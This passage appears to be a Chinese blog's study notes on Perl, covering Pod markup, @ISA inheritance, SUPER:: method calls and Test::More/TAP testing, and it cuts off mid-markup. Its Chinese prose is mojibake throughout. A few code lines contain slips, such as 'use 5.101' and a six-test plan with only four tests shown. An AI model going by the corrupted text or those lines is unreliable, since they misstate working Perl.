å…¥æ–‡æœ¬:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs excel">=head1 SYNOPSIS  <br><br>Quick summary of what the module does.<br><br>Perhaps a little <span class="hljs-built_in">code</span> snippet.<br><br>    use Animal;<br><br>    my $foo = Animal-&gt;new();<br></code></pre></td></tr></table></figure><h3 id="12-5-3-Pod-æ ¼å¼æ ‡è®°"><a href="#12-5-3-Pod-æ ¼å¼æ ‡è®°" class="headerlink" title="12.5.3 Pod æ ¼å¼æ ‡è®°"></a>12.5.3 Pod æ ¼å¼æ ‡è®°</h3><p><img src="/../img/Pod_mark.png"></p><p>å¤„ç† UTF-8:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs excel">=encoding utf8<br><br>Gilligan ...<br></code></pre></td></tr></table></figure><h3 id="12-5-4-æ£€æŸ¥-Pod-æ ¼å¼"><a href="#12-5-4-æ£€æŸ¥-Pod-æ ¼å¼" class="headerlink" title="12.5.4 æ£€æŸ¥ Pod æ ¼å¼"></a>12.5.4 æ£€æŸ¥ Pod æ ¼å¼</h3><p>å¯ä»¥ç”¨ <code>podchecker</code> æ¥æ£€æŸ¥ Pod æ–‡æ¡£çš„è¯­æ³•æ˜¯å¦æ­£ç¡®:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ podchecker lib/Animal.pm<br></code></pre></td></tr></table></figure><h2 id="12-6-æ¨¡å—ä¸­çš„ä»£ç "><a href="#12-6-æ¨¡å—ä¸­çš„ä»£ç " class="headerlink" title="12.6 æ¨¡å—ä¸­çš„ä»£ç "></a>12.6 æ¨¡å—ä¸­çš„ä»£ç </h2><p>æŒ‰ç…§æƒ¯ä¾‹ï¼ŒPerl æ¨¡å—ä½¿ç”¨åŒ…å˜é‡ <code>$VERSION</code> æ¥å£°æ˜ç‰ˆæœ¬å·.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">our</span> $VERSION = <span class="hljs-string">&#x27;0.01&#x27;</span>;<br></code></pre></td></tr></table></figure><h2 id="12-7-æ¨¡å—æ„å»ºçš„æ€»ç»“"><a href="#12-7-æ¨¡å—æ„å»ºçš„æ€»ç»“" class="headerlink" title="12.7 æ¨¡å—æ„å»ºçš„æ€»ç»“"></a>12.7 æ¨¡å—æ„å»ºçš„æ€»ç»“</h2><p>è§ä¹¦.</p><h1 id="ç¬¬13ç« -å¯¹è±¡ç®€ä»‹"><a href="#ç¬¬13ç« -å¯¹è±¡ç®€ä»‹" class="headerlink" title="ç¬¬13ç«  å¯¹è±¡ç®€ä»‹"></a>ç¬¬13ç«  å¯¹è±¡ç®€ä»‹</h1><p>ä»…åœ¨ç¨‹åºçš„é•¿åº¦è¶…è¿‡ N è¡Œå OOP (Object Oriented Programming) çš„ç›Šå¤„æ‰èƒ½ä¼šæ˜¾éœ²å‡ºæ¥.</p><p>å¯æŸ¥é˜… ã€ŠObject Oriented Perlã€‹ä¸€ä¹¦.</p><p>Perl çš„å¯¹è±¡æ¶æ„æ˜¯åœ¨åŒ…ï¼Œå­ä¾‹ç¨‹å’Œå¼•ç”¨çš„æ¦‚å¿µä¸Šå»ºç«‹çš„.</p><h2 id="13-1-å¦‚æœæˆ‘ä»¬å¯ä»¥å’ŒåŠ¨ç‰©å¯¹è¯â€¦â€¦"><a href="#13-1-å¦‚æœæˆ‘ä»¬å¯ä»¥å’ŒåŠ¨ç‰©å¯¹è¯â€¦â€¦" class="headerlink" title="13.1 å¦‚æœæˆ‘ä»¬å¯ä»¥å’ŒåŠ¨ç‰©å¯¹è¯â€¦â€¦"></a>13.1 å¦‚æœæˆ‘ä»¬å¯ä»¥å’ŒåŠ¨ç‰©å¯¹è¯â€¦â€¦</h2><h2 id="13-2-ä»‹ç»æ–¹æ³•çš„è°ƒç”¨ç®­å¤´"><a href="#13-2-ä»‹ç»æ–¹æ³•çš„è°ƒç”¨ç®­å¤´" class="headerlink" title="13.2 ä»‹ç»æ–¹æ³•çš„è°ƒç”¨ç®­å¤´"></a>13.2 ä»‹ç»æ–¹æ³•çš„è°ƒç”¨ç®­å¤´</h2><p>ç±»æ˜¯ä¸€ç»„æ‹¥æœ‰ç±»ä¼¼è¡Œä¸ºå’Œç‰¹å¾çš„äº‹ç‰©.</p><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Cow;<br><span class="hljs-keyword">use</span> Horse;<br><span class="hljs-keyword">use</span> Sheep;<br><br>Cow-&gt;speak;<br>Horse-&gt;speak;<br>Sheep-&gt;speak;<br></code></pre></td></tr></table></figure><p>å¯ä»¥å°†ç±»åæ”¾å…¥å˜é‡ä¸­ä½¿ç”¨:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $beast = <span class="hljs-string">&#x27;Cow&#x27;</span>;<br>$beast-&gt;speak;<br></code></pre></td></tr></table></figure><h2 id="13-3-æ–¹æ³•è°ƒç”¨çš„é¢å¤–å‚æ•°"><a href="#13-3-æ–¹æ³•è°ƒç”¨çš„é¢å¤–å‚æ•°" class="headerlink" title="13.3 æ–¹æ³•è°ƒç”¨çš„é¢å¤–å‚æ•°"></a>13.3 æ–¹æ³•è°ƒç”¨çš„é¢å¤–å‚æ•°</h2><p>ä¸¤ç§å½¢å¼:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">Class-&gt;method(@args);<br><br>Class::method(<span class="hljs-string">&#x27;Class&#x27;</span>, @args);<br></code></pre></td></tr></table></figure><h2 id="13-4-è°ƒç”¨ç¬¬äºŒä¸ªæ–¹æ³•è¿›ä¸€æ­¥ç®€åŒ–"><a href="#13-4-è°ƒç”¨ç¬¬äºŒä¸ªæ–¹æ³•è¿›ä¸€æ­¥ç®€åŒ–" class="headerlink" title="13.4 è°ƒç”¨ç¬¬äºŒä¸ªæ–¹æ³•è¿›ä¸€æ­¥ç®€åŒ–"></a>13.4 è°ƒç”¨ç¬¬äºŒä¸ªæ–¹æ³•è¿›ä¸€æ­¥ç®€åŒ–</h2><p>è¿™é‡Œè°ƒç”¨çš„ <code>sound</code> æ–¹æ³•è¿”å›ä¸€ä¸ªå¸¸é‡æ–‡æœ¬:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">sound</span> </span>&#123; <span class="hljs-string">&#x27;mooon&#x27;</span> &#125;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">speak</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;a $class goes &quot;</span>, $class-&gt;sound, <span class="hljs-string">&quot;!\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨ â€œç»§æ‰¿â€ æ¥å…±äº«æ–¹æ³•çš„å®šä¹‰.</p><h2 id="13-5-å…³äº-ISA-çš„å‡ ä¸ªæ³¨æ„äº‹é¡¹"><a href="#13-5-å…³äº-ISA-çš„å‡ ä¸ªæ³¨æ„äº‹é¡¹" class="headerlink" title="13.5 å…³äº @ISA çš„å‡ ä¸ªæ³¨æ„äº‹é¡¹"></a>13.5 å…³äº <code>@ISA</code> çš„å‡ ä¸ªæ³¨æ„äº‹é¡¹</h2><p><code>@ISA</code> çš„è¯»æ³•æ˜¯ <code>is a</code>.</p><p>Perl è§£é‡Šå™¨åœ¨ <code>@ISA</code> ä¸­çš„æŸ¥æ‰¾æ˜¯é€’å½’çš„ï¼Œæ·±åº¦ä¼˜å…ˆï¼Œå¹¶ä¸”ä»å·¦åˆ°å³è¿›è¡Œ.</p><p>å½“å½“å‰ç±»ä¸­æ²¡æœ‰è°ƒç”¨çš„æ–¹æ³•æ—¶ï¼ŒPerl è§£é‡Šå™¨å°±ä¼šåœ¨ <code>@ISA</code> æ•°ç»„ä¸­çš„ç±»ä¸­æŸ¥æ‰¾.</p><p>ä¸¤ç§ä½¿ç”¨æ–¹æ³•:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">@Class::ISA = <span class="hljs-string">qw(Animal)</span>;<br></code></pre></td></tr></table></figure><p>or:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Cow;<br><span class="hljs-keyword">our</span> @ISA = <span class="hljs-string">qw(Animal)</span> ;<br></code></pre></td></tr></table></figure><p>å¯ä»¥ä½¿ç”¨ç¼–è¯‘æç¤ºç¬¦ <code>use parent</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.101</span>;<br><span class="hljs-keyword">package</span> Cow;<br><span class="hljs-keyword">use</span> parent <span class="hljs-string">qw(Animal)</span>;<br></code></pre></td></tr></table></figure><h2 id="13-6-æ–¹æ³•é‡å†™"><a href="#13-6-æ–¹æ³•é‡å†™" class="headerlink" title="13.6 æ–¹æ³•é‡å†™"></a>13.6 æ–¹æ³•é‡å†™</h2><p>ç›´æ¥æ”¹å†™å³å¯ï¼Œè°ƒç”¨æ–¹æ³•æ—¶è‹¥æ˜¯åœ¨æœ¬ç±»ä¸­æ‰¾åˆ°äº†ï¼Œå°±ä¸ä¼šå» parent ä¸­æ‰¾.</p><p>åº”å½“ä½¿ç”¨ç»§æ‰¿çš„æ–¹å¼é‡ç”¨ä»£ç ï¼Œè€Œä¸æ˜¯ç”¨å¤åˆ¶å’Œç²˜è´´.</p><h2 id="13-7-å¼€å§‹ä»ä¸åŒçš„åœ°æ–¹æŸ¥æ‰¾"><a href="#13-7-å¼€å§‹ä»ä¸åŒçš„åœ°æ–¹æŸ¥æ‰¾" class="headerlink" title="13.7 å¼€å§‹ä»ä¸åŒçš„åœ°æ–¹æŸ¥æ‰¾"></a>13.7 å¼€å§‹ä»ä¸åŒçš„åœ°æ–¹æŸ¥æ‰¾</h2><h2 id="13-8-ä½¿ç”¨-SUPER-çš„å®ç°æ–¹æ³•"><a href="#13-8-ä½¿ç”¨-SUPER-çš„å®ç°æ–¹æ³•" class="headerlink" title="13.8 ä½¿ç”¨ SUPER çš„å®ç°æ–¹æ³•"></a>13.8 ä½¿ç”¨ SUPER çš„å®ç°æ–¹æ³•</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Mouse;<br><span class="hljs-keyword">use</span> parent <span class="hljs-string">qw(Animal)</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">sound</span> </span>&#123; <span class="hljs-string">&#x27;squeak&#x27;</span> &#125;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">speak</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    $class-&gt;SUPER::speak;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[but you can barely hear it!]\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>SUPER::speak</code> æ„å‘³ç€åº”å½“åœ¨å½“å‰åŒ…çš„ <code>@ISA</code> ä¸­æŸ¥æ‰¾ speak æ–¹æ³•ï¼Œå¦‚æœæ‰¾åˆ°å¤šä¸ªï¼Œå°±è°ƒç”¨ç¬¬ä¸€ä¸ª.</p><h2 id="13-9-è¦å¯¹-åšäº›ä»€ä¹ˆ"><a href="#13-9-è¦å¯¹-åšäº›ä»€ä¹ˆ" class="headerlink" title="13.9 è¦å¯¹ @_ åšäº›ä»€ä¹ˆ"></a>13.9 è¦å¯¹ <code>@_</code> åšäº›ä»€ä¹ˆ</h2><h2 id="13-10-æˆ‘ä»¬åœ¨å“ªé‡Œ"><a href="#13-10-æˆ‘ä»¬åœ¨å“ªé‡Œ" class="headerlink" title="13.10 æˆ‘ä»¬åœ¨å“ªé‡Œ"></a>13.10 æˆ‘ä»¬åœ¨å“ªé‡Œ</h2><p>å¦‚:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $beast = <span class="hljs-string">&#x27;Class&#x27;</span>;<br>$beast-&gt;method(@args);<br></code></pre></td></tr></table></figure><p>æ­¤æ—¶ï¼ŒPerl éšå¼åœ°å°†ç±»åæ”¾ç½®äºå‚æ•°åˆ—è¡¨ä¹‹å‰:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">(<span class="hljs-string">&#x27;Class&#x27;</span>, @args)<br></code></pre></td></tr></table></figure><h1 id="ç¬¬14ç« -æµ‹è¯•ç®€ä»‹"><a href="#ç¬¬14ç« -æµ‹è¯•ç®€ä»‹" class="headerlink" title="ç¬¬14ç«  æµ‹è¯•ç®€ä»‹"></a>ç¬¬14ç«  æµ‹è¯•ç®€ä»‹</h1><h2 id="14-2-Perl-çš„æµ‹è¯•æµç¨‹"><a href="#14-2-Perl-çš„æµ‹è¯•æµç¨‹" class="headerlink" title="14.2 Perl çš„æµ‹è¯•æµç¨‹"></a>14.2 Perl çš„æµ‹è¯•æµç¨‹</h2><p>Perl æµ‹è¯•æƒ¯ä¾‹æ˜¯åœ¨ Perl ç¨‹åºæ‰€åœ¨çš„æ–‡ä»¶å¤¹ä¸­å»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå«åš â€œæµ‹è¯•æ–‡ä»¶â€.</p><h3 id="é€šç”¨æµ‹è¯•åè®®"><a href="#é€šç”¨æµ‹è¯•åè®®" class="headerlink" title="é€šç”¨æµ‹è¯•åè®®"></a>é€šç”¨æµ‹è¯•åè®®</h3><p>é€šç”¨æµ‹è¯•åè®® â€“ Test Anywhere Protocol, TAP. å°±æ˜¯è§„èŒƒæµ‹è¯•çš„è¾“å‡º.</p><p>æµ‹è¯•é€šè¿‡ï¼Œè¾“å‡º ok å’Œä¸€ä¸ªæµ‹è¯•ç¼–ç .</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ok</span> <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>å¯ä»¥ç»™æµ‹è¯•é™„åŠ ä¸€ä¸ªæ ‡ç­¾ï¼Œä½¿æˆ‘ä»¬çŸ¥é“é€šè¿‡äº†ä»€ä¹ˆ:</p><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs tap"><span class="hljs-symbol">ok</span><span class="hljs-number"> 1 </span>- The boat motor works<br></code></pre></td></tr></table></figure><p>æµ‹è¯•æ²¡æœ‰é€šè¿‡ï¼Œè¾“å‡º not ok:</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript"><span class="hljs-keyword">not</span> ok <span class="hljs-number">2</span> - The hull <span class="hljs-keyword">is</span> <span class="hljs-built_in">int</span>act<br></code></pre></td></tr></table></figure><p>ç°åœ¨ Perl ä¸»è¦çš„æµ‹è¯•æ¨¡å—: Test::More.</p><p>å¦‚ä½¿ç”¨ <code>ok</code> å­ä¾‹ç¨‹:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test::More <span class="hljs-string">tests =&gt;</span> <span class="hljs-number">1</span>;<br><br>ok( try_motor(), <span class="hljs-string">&#x27;The boat motor works&#x27;</span> );<br></code></pre></td></tr></table></figure><p><code>tests =&gt; 1</code> æ˜ç¡®å£°æ˜åªæœ‰ä¸€ä¸ªæµ‹è¯•ã€‚</p><p>å¦‚æœä¸çŸ¥é“æµ‹è¯•æ•°é‡ï¼Œå°±åœ¨æµ‹è¯•ä»£ç æœ«å°¾ä½¿ç”¨ <code>done_testing</code>:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl">ok( try_motor(), <span class="hljs-string">&#x27;The boat motor works&#x27;</span> );<br><br>done_testing();<br></code></pre></td></tr></table></figure><p><code>is</code> å­ä¾‹ç¨‹ï¼Œæˆ‘ä»¬ä¼ å…¥æ‰€æ‹¥æœ‰çš„å€¼ï¼Œæ‰€æœŸæœ›çš„å€¼ï¼Œå’Œæµ‹è¯•æ ‡ç­¾:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">is( check_gas(), <span class="hljs-string">&#x27;Full&#x27;</span>, <span class="hljs-string">&#x27;The gas tank is full&#x27;</span> );<br></code></pre></td></tr></table></figure><p>è¿˜æœ‰ <code>isnt</code>, <code>like</code>, <code>unlike</code>, <code>is_deeply</code> è¿™äº›å­ä¾‹ç¨‹.</p><h2 id="14-3-æµ‹è¯•çš„è‰ºæœ¯"><a href="#14-3-æµ‹è¯•çš„è‰ºæœ¯" class="headerlink" title="14.3 æµ‹è¯•çš„è‰ºæœ¯"></a>14.3 æµ‹è¯•çš„è‰ºæœ¯</h2><p>åŸåˆ™: è®°ä½ç¼–ç¨‹è¿‡ç¨‹ä¸­æ›¾ç»çŠ¯è¿‡çš„é”™è¯¯æ˜¯å¾ˆé‡è¦çš„.</p><h3 id="ä¸€ä¸ªæµ‹è¯•ç¤ºä¾‹"><a href="#ä¸€ä¸ªæµ‹è¯•ç¤ºä¾‹" class="headerlink" title="ä¸€ä¸ªæµ‹è¯•ç¤ºä¾‹"></a>ä¸€ä¸ªæµ‹è¯•ç¤ºä¾‹</h3><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Test::More <span class="hljs-string">tests =&gt;</span> <span class="hljs-number">6</span>;<br><br>is( <span class="hljs-keyword">sqrt</span>(  <span class="hljs-number">0</span>),  <span class="hljs-number">0</span>, <span class="hljs-string">&#x27;The square root of 0   is  0&#x27;</span> );<br>is( <span class="hljs-keyword">sqrt</span>(  <span class="hljs-number">1</span>),  <span class="hljs-number">1</span>, <span class="hljs-string">&#x27;The square root of 1   is  1&#x27;</span> );<br>is( <span class="hljs-keyword">sqrt</span>( <span class="hljs-number">49</span>),  <span class="hljs-number">7</span>, <span class="hljs-string">&#x27;The square root of 49  is  7&#x27;</span> );<br>is( <span class="hljs-keyword">sqrt</span>(<span class="hljs-number">100</span>), <span class="hljs-number">10</span>, <span class="hljs-string">&#x27;The square root of 100 is 10&#x27;</span> );<br></code></pre></td></tr></table></figure><p>ç”¨ <code>eval</code> æ•è·å¾—åˆ°çš„ç»“æœ:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;<br>$n = -<span class="hljs-number">1</span>;<br><span class="hljs-keyword">eval</span> &#123; <span class="hljs-keyword">sqrt</span>($n) &#125;;<br>ok( $@, <span class="hljs-string">&#x27;$@ is set after sqrt(-1)&#x27;</span> );<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="14-4-æµ‹è¯•ç”¨å…·"><a href="#14-4-æµ‹è¯•ç”¨å…·" class="headerlink" title="14.4 æµ‹è¯•ç”¨å…·"></a>14.4 æµ‹è¯•ç”¨å…·</h2><p>å½“æˆ‘ä»¬è¿è¡Œæµ‹è¯•çš„æ—¶å€™ï¼Œè°ƒç”¨äº†ä¸€ä¸ªå«åšæµ‹è¯•ç”¨å…·çš„ä¸œè¥¿ï¼Œå®ƒå°†æŸ¥æ‰¾æ‰€æœ‰æµ‹è¯•ç¨‹åº, (ä»¥ <code>.t</code> ç»“å°¾çš„æ–‡ä»¶), é€ä¸ªè¿è¡Œå®ƒä»¬ï¼Œæ•è·è¾“å‡ºï¼Œå¹¶æä¾›ç»“æœçš„ä¸€ä¸ªæ€»ä½“æ‘˜è¦.</p><p>Test::Harness æ¨¡å—ä¼šæœé›†æµ‹è¯•è„šæœ¬ï¼Œå¹¶è¿è¡Œå®ƒä»¬ï¼Œæœ€åæ±‡æ€»ç»“æœ.</p><h2 id="14-5-æ ‡å‡†æµ‹è¯•"><a href="#14-5-æ ‡å‡†æµ‹è¯•" class="headerlink" title="14.5 æ ‡å‡†æµ‹è¯•"></a>14.5 æ ‡å‡†æµ‹è¯•</h2><p>å½“ä½¿ç”¨module-starter(æˆ–è€…h2xs)ç¨‹åºåˆ›å»ºæˆ‘ä»¬è‡ªå·±çš„å‘è¡Œç‰ˆæ—¶,å°±è‡ªåŠ¨ç”Ÿæˆäº†ä¸€äº›åˆå§‹æµ‹è¯•è„šæœ¬ä»¥åŠä¸€äº›å…¶ä»–æ–‡ä»¶ã€‚æŒ‰ç…§æƒ¯ä¾‹,æµ‹è¯•æ–‡ä»¶ä½äºtç›®å½•å¹¶ä»¥ .tæ‰©å±•åç»“å°¾ã€‚</p><p>å½“è¿è¡Œæµ‹è¯•ç¨‹åºæ—¶,æ„å»ºç¨‹åºå°†è¿è¡Œå®ƒåœ¨tç›®å½•ä¸­æ‰€æŸ¥æ‰¾åˆ°çš„æ¯ä¸ªæµ‹è¯•æ–‡ä»¶:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl Build.PL<br>$ ./Build <span class="hljs-built_in">test</span><br></code></pre></td></tr></table></figure><p>æœ‰äº›äººå§ä½œè€…æµ‹è¯•ç›®å½•è®¾ç½®æˆ <code>xt</code>, ä»¥ä¾¿ä¸ä»£ç æµ‹è¯•ç›®å½• <code>t</code> åˆ†å¼€.</p><p>åœ¨è¿™äº›æµ‹è¯•åšä»»ä½•äº‹æƒ…ä¹‹å‰,å®ƒä»¬ä¼šæ£€æŸ¥é‚£äº›éœ€è¦å®Œæˆå·¥ä½œçš„ç›¸ä¾èµ–æ¨¡å—ã€‚å¦‚æœæ²¡æœ‰,å°±å°†è·³è¿‡è¿™äº›ç›¸åº”çš„æµ‹è¯•ã€‚</p><h3 id="14-5-1-æ¨¡å—ç¼–è¯‘çš„æ£€æŸ¥"><a href="#14-5-1-æ¨¡å—ç¼–è¯‘çš„æ£€æŸ¥" class="headerlink" title="14.5.1 æ¨¡å—ç¼–è¯‘çš„æ£€æŸ¥"></a>14.5.1 æ¨¡å—ç¼–è¯‘çš„æ£€æŸ¥</h3><p>t&#x2F;00-load.t æ–‡ä»¶,è¿™æ˜¯è¿è¡Œçš„ç¬¬ä¸€ä¸ªæµ‹è¯•æ–‡ä»¶,å› ä¸ºé»˜è®¤æµ‹è¯•é¡ºåºæ˜¯æŒ‰ç…§å­—å…¸é¡ºåºæ‰§è¡Œ</p><p>ä½¿ç”¨ blib æ¨¡å—ï¼Œå…¶ä¼šæœç´¢å‘¨å›´çš„ç›®å½•ï¼ŒåŒ…æ‹¬çˆ¶ç›®å½•, ç”¨äºå°† blib æ·»åŠ åˆ° <code>@INC</code> æ•°ç»„ä¸­:</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ perl -Mblib -T t/00-load.t<br></code></pre></td></tr></table></figure><p><code>-T</code> å‚æ•°æ˜¯å¼€å¯ â€œæ±¡æŸ“â€ æ£€æŸ¥æ¨¡å¼.</p><h3 id="14-5-2-æ¨¡æ¿æµ‹è¯•"><a href="#14-5-2-æ¨¡æ¿æµ‹è¯•" class="headerlink" title="14.5.2 æ¨¡æ¿æµ‹è¯•"></a>14.5.2 æ¨¡æ¿æµ‹è¯•</h3><p><code>t/boilerplate.t</code> æ–‡ä»¶.</p><p>æˆ‘ä»¬ä¸ç”¨ä¿ç•™ <code>t/boilerplate.t</code> æ–‡ä»¶ï¼Œä¸€æ—¦æˆ‘ä»¬æ›¿æ¢äº†å ä½ç¬¦æ–‡æœ¬ï¼Œå°±å¯ä»¥åˆ é™¤è¿™ä¸ªæ–‡ä»¶äº†.</p><h3 id="14-5-3-æµ‹è¯•-Pod"><a href="#14-5-3-æµ‹è¯•-Pod" class="headerlink" title="14.5.3  æµ‹è¯• Pod"></a>14.5.3  æµ‹è¯• Pod</h3><p>æ ‡å‡†çš„ Pod æµ‹è¯•åªå…³å¿ƒä¸¤ä»¶äº‹: æˆ‘ä»¬çš„ Pod æ²¡æœ‰ä»»ä½•æ ¼å¼é”™è¯¯å’Œæˆ‘ä»¬å·²ç»ä¸ºæ¯ä¸ªå­ä¾‹ç¨‹ç¼–å†™äº†æ–‡æ¡£.</p><p>è¿™äº›æµ‹è¯•éƒ½æ˜¯å¯é€‰çš„,å¹¶ä¸”åªæœ‰åœ¨å®‰è£…äº†Test::Podæ¨¡å—å’ŒTest::Pod::Coverageæ¨¡å—åæ‰ä¼šè¿è¡Œã€‚è¿™äº›æµ‹è¯•ä¼šè‡ªåŠ¨æŸ¥æ‰¾æ‰€æœ‰æ¨¡å—æ–‡ä»¶å¹¶é€ä¸ªè¿›è¡Œæµ‹è¯•,å› æ­¤æˆ‘ä»¬ä¸ç”¨ä¿®æ”¹è¿™äº›æµ‹è¯•è„šæœ¬ã€‚</p><p>å¦‚æœæˆ‘ä»¬è¿˜æ²¡æœ‰ç»™æ–°æ·»åŠ çš„å­ä¾‹ç¨‹ç¼–å†™ç›¸åº”çš„æ–‡æ¡£,Podè¦†ç›–æµ‹è¯•å°±ä¼šæ— æ³•é€šè¿‡.</p><p>è¦ä¿®å¤è¿™ä¸ªPodæµ‹è¯•,æˆ‘ä»¬éœ€è¦ä½¿ç”¨æˆ‘ä»¬è‡ªå·±çš„æ–¹æ³•ä¸­çš„æ–‡æ¡£æ›¿æ¢å­˜æ ¹æ–‡æ¡£ä¸­çš„ä¿¡æ¯ã€‚</p><h2 id="14-6-æ·»åŠ ç¬¬ä¸€ä¸ªæµ‹è¯•"><a href="#14-6-æ·»åŠ ç¬¬ä¸€ä¸ªæµ‹è¯•" class="headerlink" title="14.6 æ·»åŠ ç¬¬ä¸€ä¸ªæµ‹è¯•"></a>14.6 æ·»åŠ ç¬¬ä¸€ä¸ªæµ‹è¯•</h2><p>æ·»åŠ è‡ªå·±çš„æµ‹è¯•æ–‡ä»¶ã€‚</p><h1 id="ç¬¬15ç« -å¸¦æ•°æ®çš„å¯¹è±¡"><a href="#ç¬¬15ç« -å¸¦æ•°æ®çš„å¯¹è±¡" class="headerlink" title="ç¬¬15ç«  å¸¦æ•°æ®çš„å¯¹è±¡"></a>ç¬¬15ç«  å¸¦æ•°æ®çš„å¯¹è±¡</h1><h2 id="15-1-é©¬å±äºé©¬ç±»ï¼Œå„ä»å…¶ç±»æ˜¯å—"><a href="#15-1-é©¬å±äºé©¬ç±»ï¼Œå„ä»å…¶ç±»æ˜¯å—" class="headerlink" title="15.1 é©¬å±äºé©¬ç±»ï¼Œå„ä»å…¶ç±»æ˜¯å—"></a>15.1 é©¬å±äºé©¬ç±»ï¼Œå„ä»å…¶ç±»æ˜¯å—</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">package</span> Animal;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">speak</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $class = <span class="hljs-keyword">shift</span>;<br>    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;a $class goes &quot;</span>, $class-&gt;sound, <span class="hljs-string">&quot;!\n&quot;</span>;<br>&#125;<br><br><span class="hljs-keyword">package</span> Horse;<br>@ISA = <span class="hljs-string">qw(Animal)</span>;<br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">sound</span> 